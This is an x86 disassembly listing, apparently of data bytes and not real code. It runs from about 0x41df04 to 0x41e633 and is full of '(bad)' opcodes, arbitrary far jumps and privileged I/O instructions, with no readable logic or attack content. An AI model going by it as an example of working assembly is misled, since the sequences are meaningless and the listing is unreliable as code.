  41df04:	cmp    ah,BYTE PTR [eax]
  41df06:	push   0x625a4c2c
  41df0b:	xchg   ebx,eax
  41df0c:	sub    BYTE PTR [edi],cl
  41df0e:	mov    esp,0x5fa72652
  41df13:	fwait
  41df14:	lds    ecx,FWORD PTR [ebp+0x16]
  41df17:	ror    DWORD PTR [ebp-0x2d],cl
  41df1a:	not    BYTE PTR [esp+ebp*4+0x5d0604ab]
  41df21:	outs   dx,DWORD PTR ds:[esi]
  41df22:	xor    al,0x8f
  41df24:	adc    eax,0x7d8d3374
  41df29:	call   0xac0d:0x2a247ad4
  41df30:	or     al,0x7d
  41df32:	test   BYTE PTR [edx],dl
  41df34:	add    edx,ecx
  41df36:	push   esi
  41df37:	fstp   st(5)
  41df39:	cmp    al,BYTE PTR [edi]
  41df3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df3c:	sbb    DWORD PTR [edx+0x5f98cd58],edi
  41df42:	push   cs
  41df43:	aaa    
  41df44:	push   ds
  41df45:	push   ebp
  41df46:	xchg   ebp,eax
  41df47:	adc    BYTE PTR [ecx-0x42eefb4a],bh
  41df4d:	sub    dl,BYTE PTR [ebx-0x3c]
  41df50:	js     0x41df1c
  41df52:	mov    dl,0x66
  41df54:	div    ah
  41df56:	push   cs
  41df57:	jl     0x41df59
  41df59:	aad    0x24
  41df5b:	dec    esp
  41df5c:	sub    edx,edi
  41df5e:	mov    ecx,0x5f6bc4ec
  41df63:	es xchg esp,eax
  41df65:	xlat   BYTE PTR ds:[ebx]
  41df66:	jmp    0x874e:0x131e987d
  41df6d:	je     0x41df1b
  41df6f:	ins    DWORD PTR es:[edi],dx
  41df70:	dec    ecx
  41df71:	adc    BYTE PTR [edi+0xbd6247f],al
  41df77:	mov    edi,0xfb2211fb
  41df7c:	(bad)  
  41df7d:	jmp    0x3577:0x16d72d09
  41df84:	xor    eax,DWORD PTR [edx+0x5a11b38f]
  41df8a:	aad    0x4
  41df8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df8d:	adc    BYTE PTR [eax],0x8f
  41df90:	stc    
  41df91:	mov    ebx,0x87063dec
  41df96:	add    DWORD PTR cs:[edi-0x78],ecx
  41df9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df9b:	cmp    eax,0x578b0e03
  41dfa0:	jo     0x41dffd
  41dfa2:	dec    edx
  41dfa3:	xlat   BYTE PTR ds:[ebx]
  41dfa4:	dec    eax
  41dfa5:	and    al,0x1d
  41dfa7:	sub    al,BYTE PTR [edi+0x20]
  41dfaa:	mov    ah,0xe0
  41dfac:	out    0xea,eax
  41dfae:	es gs dec ebp
  41dfb1:	mov    ecx,0x4ac93b78
  41dfb6:	fimul  WORD PTR [edx]
  41dfb8:	sub    ah,BYTE PTR [ebx]
  41dfba:	not    BYTE PTR [ebx+ebx*4]
  41dfbd:	fimul  DWORD PTR [edi-0x6a687f4b]
  41dfc3:	pop    ss
  41dfc4:	adc    eax,DWORD PTR [edi+ebp*8+0x1f3ab617]
  41dfcb:	call   0x5ffc:0x13c0cd90
  41dfd2:	sub    al,0x60
  41dfd4:	pop    DWORD PTR [ebp-0x64]
  41dfd7:	neg    BYTE PTR [edx+0x4]
  41dfda:	inc    edi
  41dfdb:	aam    0x21
  41dfdd:	cmp    ah,BYTE PTR [ebp+ecx*1+0x4]
  41dfe1:	and    BYTE PTR [ebx+0x28],dl
  41dfe4:	pop    edi
  41dfe5:	test   eax,0xbcd4c90e
  41dfea:	stc    
  41dfeb:	test   BYTE PTR [edi+0x804fa7b],cl
  41dff1:	xchg   edi,eax
  41dff2:	jns    0x41df86
  41dff4:	add    esi,edi
  41dff6:	pop    edx
  41dff7:	popa   
  41dff8:	enter  0x70a1,0x4f
  41dffc:	ja     0x41e07b
  41dffe:	jg     0x41e02a
  41e000:	xchg   ebx,esi
  41e002:	mov    ch,0xb6
  41e004:	or     edi,ecx
  41e006:	pop    ss
  41e007:	pop    edi
  41e008:	dec    eax
  41e009:	sub    eax,0x86235016
  41e00e:	adc    DWORD PTR [edx],eax
  41e010:	mov    edi,0x87e4b38e
  41e015:	mov    esi,0xf9a9d31c
  41e01a:	jecxz  0x41dfd2
  41e01c:	mov    esi,ebp
  41e01e:	cwde   
  41e01f:	iret   
  41e020:	fist   WORD PTR [ebx]
  41e022:	shr    BYTE PTR [ebp+0xbad91b],1
  41e028:	ret    
  41e029:	xchg   edi,eax
  41e02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e02b:	pop    esi
  41e02c:	or     ebp,ebx
  41e02e:	in     eax,dx
  41e02f:	test   al,0x5a
  41e031:	scas   al,BYTE PTR es:[edi]
  41e032:	jb     0x41e00d
  41e034:	sti    
  41e035:	pop    ebp
  41e036:	shl    BYTE PTR [esi-0x6b79d5a8],0x8b
  41e03d:	pop    ebp
  41e03e:	xchg   esi,eax
  41e03f:	mov    ebx,DWORD PTR [eax-0x6030ea98]
  41e045:	jg     0x41dfe4
  41e047:	jnp    0x41e04f
  41e049:	add    ebp,ecx
  41e04b:	sbb    al,0x59
  41e04d:	push   ss
  41e04e:	pop    ds
  41e04f:	and    ch,al
  41e051:	ins    DWORD PTR es:[edi],dx
  41e052:	in     eax,dx
  41e053:	inc    edx
  41e054:	loop   0x41e065
  41e056:	mov    bl,BYTE PTR [eax]
  41e058:	xlat   BYTE PTR ds:[ebx]
  41e059:	cld    
  41e05a:	adc    edi,DWORD PTR [edx-0xa]
  41e05d:	fst    DWORD PTR [esi-0x5f4c36fd]
  41e063:	or     al,0x22
  41e065:	jge    0x41e0db
  41e067:	add    BYTE PTR [edi],0x84
  41e06a:	out    0x85,al
  41e06c:	in     eax,0xca
  41e06e:	push   edi
  41e06f:	adc    edx,DWORD PTR es:[eax+0x28]
  41e073:	xor    BYTE PTR [ebx+0x34],bh
  41e076:	ret    
  41e077:	scas   eax,DWORD PTR es:[edi]
  41e078:	mov    cl,0xb8
  41e07a:	cmp    eax,0xdc027100
  41e07f:	sbb    al,0xae
  41e081:	jmp    0x41e004
  41e083:	(bad)  
  41e084:	jmp    0xd7ab13ef
  41e089:	inc    eax
  41e08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08b:	inc    esp
  41e08c:	int    0x71
  41e08e:	daa    
  41e08f:	inc    esi
  41e090:	retf   0x4a0d
  41e093:	imul   ebp,DWORD PTR [eax],0xb228c600
  41e099:	setnp  BYTE PTR [ebx]
  41e09c:	scas   eax,DWORD PTR es:[edi]
  41e09d:	retf   0x1ca4
  41e0a0:	ret    0x76b4
  41e0a3:	ja     0x41e0fc
  41e0a5:	sub    al,ch
  41e0a7:	or     esp,eax
  41e0a9:	scas   al,BYTE PTR es:[edi]
  41e0aa:	mov    ch,0x18
  41e0ac:	addr16 mov cl,0x57
  41e0af:	push   esi
  41e0b0:	fmul   QWORD PTR [edx]
  41e0b2:	sub    ch,BYTE PTR [ebx+0x6abf8a29]
  41e0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0b9:	mov    BYTE PTR [ebp-0xa],bl
  41e0bc:	pop    ebp
  41e0bd:	lahf   
  41e0be:	lods   al,BYTE PTR ds:[esi]
  41e0bf:	ins    BYTE PTR es:[edi],dx
  41e0c0:	das    
  41e0c1:	and    BYTE PTR [esi+0x50],dl
  41e0c4:	inc    esp
  41e0c5:	mov    ah,0x3a
  41e0c7:	call   0xcc9d:0x33f149ff
  41e0ce:	imul   ebp,DWORD PTR [edx],0x127aa7d1
  41e0d4:	out    0xea,al
  41e0d6:	jne    0x41e125
  41e0d8:	icebp  
  41e0d9:	push   ss
  41e0da:	out    dx,eax
  41e0db:	pop    ebp
  41e0dc:	cmp    dl,dh
  41e0de:	je     0x41e0ca
  41e0e0:	or     al,0x20
  41e0e2:	sbb    al,0x57
  41e0e4:	adc    DWORD PTR [eax],edx
  41e0e6:	xor    cl,bh
  41e0e8:	and    cl,BYTE PTR [edi-0x73]
  41e0eb:	dec    esi
  41e0ec:	xchg   esp,eax
  41e0ed:	cmp    BYTE PTR [ecx-0x2b55b9ea],dh
  41e0f3:	(bad)  
  41e0f4:	das    
  41e0f5:	fisub  WORD PTR [ebp-0x1ba5ea1a]
  41e0fb:	out    0xd5,eax
  41e0fd:	sub    al,0x0
  41e0ff:	pushf  
  41e100:	mov    ebx,0x6a356b12
  41e105:	pop    edi
  41e106:	cs loopne 0x41e11b
  41e109:	cmp    eax,0x41466b65
  41e10e:	fsub   DWORD PTR [ebx]
  41e110:	push   ebx
  41e111:	xchg   ebx,eax
  41e112:	mov    esi,DWORD PTR [ebp-0x3b223d33]
  41e118:	cld    
  41e119:	enter  0xede6,0x30
  41e11d:	sbb    dl,al
  41e11f:	xchg   esp,eax
  41e120:	push   edi
  41e121:	and    al,0xc1
  41e123:	xchg   esp,eax
  41e124:	ja     0x41e0b4
  41e126:	stos   BYTE PTR es:[edi],al
  41e127:	(bad)  
  41e129:	mov    esp,0x9d0819ab
  41e12e:	dec    ecx
  41e12f:	lods   al,BYTE PTR ds:[esi]
  41e130:	jmp    0x891b:0xf83dec79
  41e137:	aad    0x3c
  41e139:	cmp    ebx,DWORD PTR [edi-0x437c52cf]
  41e13f:	cmp    eax,0xa51eb048
  41e144:	xor    cl,cl
  41e146:	stos   BYTE PTR es:[edi],al
  41e147:	mov    dl,0x74
  41e149:	adc    bh,BYTE PTR [ecx-0x3d958d70]
  41e14f:	push   0x8a1e08e8
  41e154:	shr    BYTE PTR [esi],1
  41e156:	xchg   esp,eax
  41e157:	fld    TBYTE PTR [esi]
  41e159:	add    edx,DWORD PTR [ebx]
  41e15b:	pop    es
  41e15c:	aas    
  41e15d:	push   0xcb876fbd
  41e162:	mov    ah,0x1f
  41e164:	loopne 0x41e106
  41e166:	mov    ch,0xf0
  41e168:	test   DWORD PTR [esi+0x9c5cf82],ecx
  41e16e:	sub    BYTE PTR [edx-0x46],cl
  41e171:	push   edi
  41e172:	shl    BYTE PTR [edx-0x60cde7bb],cl
  41e178:	into   
  41e179:	out    dx,eax
  41e17a:	dec    ebp
  41e17b:	push   0xfe5181e8
  41e180:	fadd   st(6),st
  41e182:	mov    ebx,0xd50c3c47
  41e187:	push   esp
  41e188:	pop    ebp
  41e189:	jns    0x41e159
  41e18b:	call   0x26538948
  41e190:	adc    al,0x59
  41e192:	test   al,0xbc
  41e194:	xchg   ebp,eax
  41e195:	or     ah,al
  41e197:	cmp    edi,DWORD PTR [esi-0x78]
  41e19a:	jnp    0x41e14d
  41e19c:	xor    esi,DWORD PTR [eax+ebx*8-0x2a]
  41e1a0:	and    BYTE PTR [edx],al
  41e1a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1a3:	ja     0x41e185
  41e1a5:	cwde   
  41e1a6:	test   BYTE PTR [edx-0x76],ch
  41e1a9:	cmp    ch,bh
  41e1ab:	cmp    bh,dh
  41e1ad:	stos   BYTE PTR es:[edi],al
  41e1ae:	jecxz  0x41e15a
  41e1b0:	xchg   esp,eax
  41e1b1:	and    edx,DWORD PTR fs:[ecx-0x265468ef]
  41e1b8:	xchg   esp,eax
  41e1b9:	jmp    0x41e16d
  41e1bb:	cwde   
  41e1bc:	gs sbb eax,edi
  41e1bf:	cmp    al,0xf2
  41e1c1:	and    eax,0xd299f81a
  41e1c6:	(bad)  
  41e1c8:	mov    ds:0x7b12e823,al
  41e1cd:	xchg   edi,eax
  41e1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1cf:	pop    ds
  41e1d0:	mov    ds:0x9a6107b5,eax
  41e1d5:	inc    ebx
  41e1d6:	xchg   ebp,eax
  41e1d7:	mov    ebp,0xc7210512
  41e1dc:	ja     0x41e203
  41e1de:	mov    WORD PTR fs:[eax+0x6c],ss
  41e1e2:	and    dl,BYTE PTR [ebx+esi*2+0x615a8299]
  41e1e9:	inc    ebp
  41e1ea:	cdq    
  41e1eb:	jb     0x41e25c
  41e1ed:	mov    esi,ebx
  41e1ef:	fiadd  DWORD PTR [ebp-0x1b9047f]
  41e1f5:	jg     0x41e210
  41e1f7:	dec    edi
  41e1f8:	jp     0x41e1db
  41e1fa:	outs   dx,DWORD PTR ds:[esi]
  41e1fb:	leave  
  41e1fc:	fs push 0x73
  41e1ff:	mov    ecx,0xb9dc078
  41e204:	cmp    edx,DWORD PTR [esi-0x20c381d8]
  41e20a:	push   esp
  41e20b:	mov    al,0x3c
  41e20d:	popa   
  41e20e:	add    bh,BYTE PTR [edi]
  41e210:	inc    ebp
  41e211:	lea    esp,[esi-0x31a51e83]
  41e217:	xor    al,ch
  41e219:	xchg   ecx,eax
  41e21a:	sbb    eax,0xebd5a6bc
  41e21f:	jo     0x41e20b
  41e221:	jg     0x41e1c8
  41e223:	or     bl,bh
  41e225:	call   0x12f:0xc8c1e430
  41e22c:	aad    0x77
  41e22e:	jns    0x41e1d5
  41e230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e231:	and    BYTE PTR [ebp+0x3f],ah
  41e234:	or     ebx,edx
  41e236:	and    eax,0xbd0bfdd3
  41e23b:	pusha  
  41e23c:	or     al,0x9e
  41e23e:	cmp    eax,0xab666273
  41e243:	mov    ds:0x36e23c5a,eax
  41e248:	(bad)  
  41e249:	pop    ebx
  41e24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e24b:	pop    es
  41e24c:	add    eax,0x42fad411
  41e251:	stos   BYTE PTR es:[edi],al
  41e252:	add    ch,BYTE PTR fs:[edx]
  41e255:	mov    bh,0x21
  41e257:	xor    DWORD PTR [esi+esi*1-0x8],eax
  41e25b:	fxch   st(7)
  41e25d:	jge    0x41e2d7
  41e25f:	in     eax,dx
  41e260:	and    bl,dh
  41e262:	ja     0x41e2dd
  41e264:	hlt    
  41e265:	test   al,0x5b
  41e267:	pop    edi
  41e268:	sub    DWORD PTR [ebx-0x6725a62c],edx
  41e26e:	int    0xe5
  41e270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e271:	fisttp QWORD PTR [esi-0x50]
  41e274:	lds    ebx,FWORD PTR [esi+0x2f44298e]
  41e27a:	mov    ch,0xba
  41e27c:	mov    ah,BYTE PTR [esi]
  41e27e:	clc    
  41e27f:	or     al,0xf4
  41e281:	or     al,0xd9
  41e283:	test   BYTE PTR [ecx*4-0x3bf12a93],dl
  41e28a:	js     0x41e24a
  41e28c:	sar    BYTE PTR [ebx*8+0x45e2b8f7],1
  41e293:	xchg   ebp,eax
  41e294:	sti    
  41e295:	adc    BYTE PTR [ecx+0x958d366],bl
  41e29b:	sbb    al,0x6f
  41e29d:	pop    ss
  41e29e:	stc    
  41e29f:	ffreep st(2)
  41e2a1:	jge    0x41e2c8
  41e2a3:	push   es
  41e2a4:	hlt    
  41e2a5:	add    DWORD PTR [edx-0x52],eax
  41e2a8:	mov    edi,0xe5416e80
  41e2ad:	pop    edx
  41e2ae:	das    
  41e2af:	popa   
  41e2b0:	psubq  mm7,QWORD PTR [ecx+0x362576e8]
  41e2b7:	lods   eax,DWORD PTR ds:[esi]
  41e2b8:	or     eax,0x72821d9f
  41e2bd:	cmp    ebp,ebx
  41e2bf:	inc    esi
  41e2c0:	or     BYTE PTR [esi],0x4a
  41e2c3:	rol    DWORD PTR [ebx+edx*2],0x8c
  41e2c7:	fisubr DWORD PTR [edx]
  41e2c9:	xor    eax,0x48468c6e
  41e2ce:	fiadd  WORD PTR [esi]
  41e2d0:	ret    0xb5cc
  41e2d3:	xor    eax,0x15eeb67
  41e2d8:	jge    0x41e25e
  41e2da:	inc    esp
  41e2db:	(bad)  
  41e2dc:	push   0x5b
  41e2de:	dec    esp
  41e2e0:	sub    ebx,DWORD PTR fs:[edx+0x485e8b7c]
  41e2e7:	mov    DWORD PTR [edi+0x70],ebp
  41e2ea:	call   0x99d46513
  41e2ef:	shl    al,1
  41e2f1:	sar    DWORD PTR [ebp-0x7e],0xfa
  41e2f5:	pop    esp
  41e2f6:	cmp    DWORD PTR [eax],edi
  41e2f8:	mov    ah,0x6d
  41e2fa:	mov    ecx,0xb87fd989
  41e2ff:	add    DWORD PTR [eax+esi*4-0x30],eax
  41e303:	imul   esp,DWORD PTR [eax],0x2d
  41e306:	inc    edx
  41e307:	mov    bl,0x16
  41e309:	les    edx,FWORD PTR [edi+0x1b]
  41e30c:	pop    ebx
  41e30d:	push   ebp
  41e30e:	jae    0x41e2dd
  41e310:	pop    ebp
  41e311:	ins    BYTE PTR es:[edi],dx
  41e312:	dec    ebp
  41e313:	pcmpeqd mm0,QWORD PTR [eax]
  41e316:	jp     0x41e392
  41e318:	push   cs
  41e319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31a:	(bad)  
  41e31b:	aam    0x7
  41e31d:	push   edi
  41e31e:	sub    eax,0x3dd06370
  41e323:	bound  ebx,QWORD PTR [edx+0x236c1434]
  41e329:	imul   edi,DWORD PTR [edx-0x46049b11],0x7a
  41e330:	mov    cs,WORD PTR [esi+esi*8+0x1b]
  41e334:	gs inc esi
  41e336:	xchg   ecx,eax
  41e337:	lahf   
  41e338:	in     eax,dx
  41e339:	add    ecx,ebx
  41e33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e33c:	aas    
  41e33d:	xor    DWORD PTR [ecx+0xe9759f8],0xd6cf78a1
  41e347:	std    
  41e348:	cmp    DWORD PTR [edx+0x456f7d0],edx
  41e34e:	adc    al,0x5f
  41e350:	ror    BYTE PTR [edx+eax*8],0xd1
  41e354:	icebp  
  41e355:	loope  0x41e365
  41e357:	iret   
  41e358:	jecxz  0x41e3c2
  41e35a:	mov    al,0x49
  41e35c:	retf   0xece6
  41e35f:	sti    
  41e360:	push   ds
  41e361:	lahf   
  41e362:	adc    al,0x5a
  41e364:	pop    ebp
  41e365:	xchg   ebp,eax
  41e366:	sub    edi,DWORD PTR [edx-0x1a4f6fa0]
  41e36c:	sahf   
  41e36d:	in     eax,dx
  41e36e:	and    eax,DWORD PTR [eax]
  41e370:	das    
  41e371:	fcomp  QWORD PTR [ecx+edx*2]
  41e374:	push   es
  41e375:	cmp    edx,ebx
  41e377:	cmp    esp,edx
  41e379:	mov    edx,0xe5a76272
  41e37e:	ins    DWORD PTR es:[edi],dx
  41e37f:	fwait
  41e380:	sub    ah,0x75
  41e383:	push   0x3b7dd9c
  41e388:	lahf   
  41e389:	test   BYTE PTR [eax+0x1d0e7475],cl
  41e38f:	nop
  41e390:	xchg   esi,eax
  41e391:	adc    al,0x39
  41e393:	test   DWORD PTR ds:0x6e3e8553,ecx
  41e399:	push   ebp
  41e39a:	hlt    
  41e39b:	lods   al,BYTE PTR ds:[esi]
  41e39c:	add    bl,al
  41e39e:	xchg   ax,ax
  41e3a0:	or     ebx,DWORD PTR [ecx]
  41e3a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3a3:	mov    eax,ds:0xd7d9219c
  41e3a8:	test   al,0xd7
  41e3aa:	and    eax,DWORD PTR [ebx+0x6a26cb84]
  41e3b0:	push   ds
  41e3b1:	or     BYTE PTR [esi],al
  41e3b3:	inc    esp
  41e3b4:	shl    BYTE PTR [eax-0xef43f80],0xaa
  41e3bb:	cmp    BYTE PTR [edx-0x73],0xcb
  41e3bf:	cs push esp
  41e3c1:	pushf  
  41e3c2:	sbb    al,0x12
  41e3c4:	jo     0x41e364
  41e3c6:	mov    eax,ds:0x49344cb5
  41e3cb:	jecxz  0x41e3b8
  41e3cd:	push   0x62
  41e3cf:	adc    BYTE PTR [ebx-0x3a401b46],0x95
  41e3d6:	adc    edi,ebp
  41e3d8:	in     eax,dx
  41e3d9:	push   ss
  41e3da:	and    eax,DWORD PTR [ebp+0x694ea842]
  41e3e0:	(bad)  
  41e3e2:	mov    dh,0x98
  41e3e4:	retf   
  41e3e5:	lahf   
  41e3e6:	add    DWORD PTR [eax+0xb],ecx
  41e3e9:	jmp    0x9e60f335
  41e3ee:	mov    es,WORD PTR [esi+ebp*1+0x635ea0d7]
  41e3f5:	cmp    al,0xd9
  41e3f7:	sbb    DWORD PTR [eax+ebp*4+0x537250e4],edx
  41e3fe:	test   BYTE PTR [esi],ch
  41e400:	jp     0x41e417
  41e402:	or     bh,BYTE PTR ds:0x2067e80b
  41e408:	ja     0x41e46f
  41e40a:	gs mov ch,0xb2
  41e40d:	lds    eax,FWORD PTR [eax-0x43ffe5ac]
  41e413:	popa   
  41e414:	jp     0x41e3c2
  41e416:	xchg   esi,eax
  41e417:	add    bl,BYTE PTR [edi-0x43]
  41e41a:	je     0x41e3cd
  41e41c:	fs inc esp
  41e41e:	ret    0xf750
  41e421:	(bad)  
  41e422:	jmp    0x41e3bb
  41e424:	int    0xc5
  41e426:	loopne 0x41e3db
  41e428:	cmc    
  41e429:	cmp    eax,0x66edf9dd
  41e42e:	leave  
  41e42f:	aaa    
  41e430:	and    al,0x4c
  41e432:	mov    ecx,0x5be4a24f
  41e437:	push   cs
  41e438:	fst    st(1)
  41e43a:	loopne 0x41e4ba
  41e43c:	jmp    0x41e429
  41e43e:	jb     0x41e409
  41e440:	data16 lods al,BYTE PTR ds:[esi]
  41e442:	sbb    esi,DWORD PTR [ebx+0x2f1c5d6]
  41e448:	dec    ebx
  41e449:	adc    al,0xad
  41e44b:	xchg   BYTE PTR [bx+0x764c],bl
  41e450:	int3   
  41e451:	mov    ecx,0x78ee6910
  41e456:	or     esp,esp
  41e458:	adc    BYTE PTR [edx-0x4e],0x64
  41e45c:	inc    edx
  41e45d:	jecxz  0x41e451
  41e45f:	pop    eax
  41e460:	pop    edx
  41e461:	mov    ch,BYTE PTR [edx+0x63]
  41e464:	imul   eax,DWORD PTR [ebx-0x1e],0xffffffdf
  41e468:	dec    ebp
  41e469:	dec    esp
  41e46a:	or     al,0x6f
  41e46c:	xor    BYTE PTR [ebp-0x7f],dh
  41e46f:	add    eax,0x362e64c4
  41e474:	scas   al,BYTE PTR es:[edi]
  41e475:	or     ah,BYTE PTR [ecx+eiz*8+0x1f]
  41e479:	or     BYTE PTR [ecx],0xcc
  41e47c:	and    BYTE PTR [ebp-0x8],bl
  41e47f:	es inc edx
  41e481:	mov    ch,0x27
  41e483:	inc    ebx
  41e484:	xor    dh,BYTE PTR [ebx+0x3862696a]
  41e48a:	shl    bl,1
  41e48c:	push   ebp
  41e48d:	sbb    BYTE PTR [edx-0x50],0x46
  41e491:	(bad)  [esi-0x6]
  41e494:	push   ds
  41e495:	xchg   edi,eax
  41e496:	stos   DWORD PTR es:[edi],eax
  41e497:	mov    eax,0xa4130967
  41e49c:	ror    DWORD PTR [edi+0x4d],1
  41e49f:	push   eax
  41e4a0:	xor    BYTE PTR [esi+0x67],dh
  41e4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4a4:	xor    al,0xd4
  41e4a6:	mov    bl,0x57
  41e4a8:	mov    ds:0x7441f58b,eax
  41e4ad:	jb     0x41e4d8
  41e4af:	icebp  
  41e4b0:	test   BYTE PTR [edx-0x13],dh
  41e4b3:	inc    ecx
  41e4b4:	cmp    edx,DWORD PTR [eax]
  41e4b6:	aad    0x48
  41e4b8:	push   es
  41e4b9:	xor    esi,DWORD PTR [ebx-0x1b]
  41e4bc:	das    
  41e4bd:	xor    al,ch
  41e4bf:	dec    ebx
  41e4c0:	or     eax,esi
  41e4c2:	cmp    edx,ebx
  41e4c4:	xor    eax,0x5052ec81
  41e4c9:	aad    0x8d
  41e4cb:	out    dx,al
  41e4cc:	sub    eax,0x47c70779
  41e4d1:	inc    ebp
  41e4d2:	cdq    
  41e4d3:	lods   al,BYTE PTR ds:[esi]
  41e4d4:	shr    ch,0x71
  41e4d7:	push   0x9
  41e4d9:	pop    ds
  41e4da:	hlt    
  41e4db:	push   0xffffff83
  41e4dd:	inc    esi
  41e4de:	mov    ds:0x8d3e30f3,al
  41e4e3:	mov    bl,0xda
  41e4e5:	or     BYTE PTR [ebx-0x9],bl
  41e4e8:	jnp    0x41e4a0
  41e4ea:	aad    0xb6
  41e4ec:	ss data16 aaa 
  41e4ef:	call   0x1762fa4a
  41e4f4:	in     al,dx
  41e4f5:	mov    ah,BYTE PTR [ebx+ecx*2]
  41e4f8:	mov    dl,ch
  41e4fa:	mov    esp,0xdb532158
  41e4ff:	or     eax,0xd0a3796c
  41e504:	fwait
  41e505:	inc    ebp
  41e506:	dec    ebp
  41e507:	mov    eax,DWORD PTR [edx]
  41e509:	fwait
  41e50a:	out    0x61,al
  41e50c:	nop
  41e50d:	dec    ebp
  41e50e:	add    al,0x75
  41e510:	adc    eax,0xb579939d
  41e515:	add    BYTE PTR [ebx+0x66],al
  41e518:	dec    esp
  41e519:	mov    WORD PTR [ecx],?
  41e51b:	hlt    
  41e51c:	jbe    0x41e570
  41e51e:	fs inc esi
  41e520:	aaa    
  41e521:	loope  0x41e4da
  41e523:	cdq    
  41e524:	repz sbb eax,0xc261a66b
  41e52a:	mov    esp,0xbc0be0ef
  41e52f:	mov    ah,dh
  41e531:	leave  
  41e532:	xchg   DWORD PTR [edx-0x5e],esp
  41e535:	stc    
  41e536:	lods   al,BYTE PTR ds:[esi]
  41e537:	jp     0x41e5ae
  41e539:	(bad)  
  41e53b:	arpl   WORD PTR [edi+eiz*1-0x20],sp
  41e53f:	aas    
  41e540:	push   ebx
  41e541:	inc    DWORD PTR [esi+eax*1-0x55f0b457]
  41e548:	into   
  41e549:	in     eax,0xf6
  41e54b:	mov    DWORD PTR [ebx],ebp
  41e54d:	push   esi
  41e54e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e54f:	xor    eax,0x3b01b5e4
  41e554:	scas   eax,DWORD PTR es:[edi]
  41e555:	mov    ecx,DWORD PTR [ebx+ebp*4]
  41e558:	mov    dl,0xc8
  41e55a:	pop    ebx
  41e55b:	add    ch,BYTE PTR [eax]
  41e55d:	leave  
  41e55e:	push   ds
  41e55f:	sub    dh,BYTE PTR [ecx]
  41e561:	cmp    al,0x54
  41e563:	and    ch,BYTE PTR [ebx]
  41e565:	xchg   esi,eax
  41e566:	test   al,0x94
  41e568:	(bad)  
  41e569:	fst    DWORD PTR [ecx+edx*8+0x133f3e43]
  41e570:	mov    ebx,0x2001a0e
  41e575:	inc    edi
  41e576:	xchg   ebp,eax
  41e577:	stos   DWORD PTR es:[edi],eax
  41e578:	pop    esp
  41e579:	mov    eax,ds:0x288e5c19
  41e57e:	xchg   esp,eax
  41e57f:	inc    ecx
  41e580:	jnp    0x41e5c6
  41e582:	hlt    
  41e583:	jecxz  0x41e58e
  41e585:	mov    bl,al
  41e587:	rol    DWORD PTR [esp+ebp*8+0x6f5d8e98],0x61
  41e58f:	pop    edi
  41e590:	lahf   
  41e591:	repz mov al,0xbf
  41e594:	push   0xbd684ba5
  41e599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e59a:	xlat   BYTE PTR ds:[ebx]
  41e59b:	mov    gs,WORD PTR [ecx]
  41e59d:	cs mov esp,0x833356bb
  41e5a3:	push   edi
  41e5a4:	cwde   
  41e5a5:	add    DWORD PTR [edx],ebx
  41e5a7:	push   esi
  41e5a8:	cmp    BYTE PTR [eax+edx*4+0x677fc396],al
  41e5af:	push   ebx
  41e5b0:	and    esp,esp
  41e5b2:	loope  0x41e5b6
  41e5b4:	xlat   BYTE PTR ds:[ebx]
  41e5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b6:	jns    0x41e5d3
  41e5b8:	add    BYTE PTR [ebx-0x34cadee0],bl
  41e5be:	mov    cl,0x15
  41e5c0:	scas   eax,DWORD PTR es:[edi]
  41e5c1:	shl    DWORD PTR [esi+ebp*4+0x79],0x13
  41e5c6:	cmp    al,0x17
  41e5c8:	add    DWORD PTR [esi],edi
  41e5ca:	and    ebx,ebx
  41e5cc:	les    ebx,FWORD PTR [edi]
  41e5ce:	out    dx,eax
  41e5cf:	add    bl,BYTE PTR [edi]
  41e5d1:	scas   eax,DWORD PTR es:[edi]
  41e5d2:	ins    BYTE PTR es:[edi],dx
  41e5d3:	adc    eax,DWORD PTR [edi+eiz*1-0x40]
  41e5d7:	adc    dh,cl
  41e5d9:	mov    WORD PTR es:[ebx],ss
  41e5dc:	std    
  41e5dd:	mov    eax,ds:0xd1d5c53
  41e5e2:	stc    
  41e5e3:	mov    al,BYTE PTR [edx]
  41e5e5:	dec    edi
  41e5e6:	sbb    DWORD PTR [ebp-0x6f],esp
  41e5e9:	jae    0x41e611
  41e5eb:	leave  
  41e5ec:	aaa    
  41e5ed:	retf   
  41e5ee:	lods   eax,DWORD PTR ds:[esi]
  41e5ef:	pushf  
  41e5f0:	cmp    ecx,DWORD PTR [edx]
  41e5f2:	lock leave 
  41e5f4:	adc    ecx,edx
  41e5f6:	dec    BYTE PTR [esi+ebp*4+0x1]
  41e5fa:	xchg   edi,eax
  41e5fb:	ds retf 0xb22a
  41e5ff:	cli    
  41e600:	add    eax,0x2f900bec
  41e605:	jno    0x41e602
  41e607:	shl    BYTE PTR [edi-0x2d],1
  41e60a:	jo     0x41e661
  41e60c:	xchg   dx,ax
  41e60e:	inc    ecx
  41e60f:	(bad)  
  41e610:	jmp    0xf00d284e
  41e615:	cli    
  41e616:	in     al,0x55
  41e618:	bound  edi,QWORD PTR [esi+0x65]
  41e61b:	rcr    BYTE PTR ds:0x7de4bc08,1
  41e621:	fisttp QWORD PTR [ebx+0x7d]
  41e624:	pop    eax
  41e625:	pop    ebp
  41e626:	jns    0x41e69a
  41e628:	or     bl,cl
  41e62a:	leave  
  41e62b:	push   edx
  41e62c:	dec    ecx
  41e62d:	test   esp,esp
  41e62f:	lock mov dl,BYTE PTR [ecx]
  41e632:	inc    edx
  41e633:	jbe    0x41e5e9
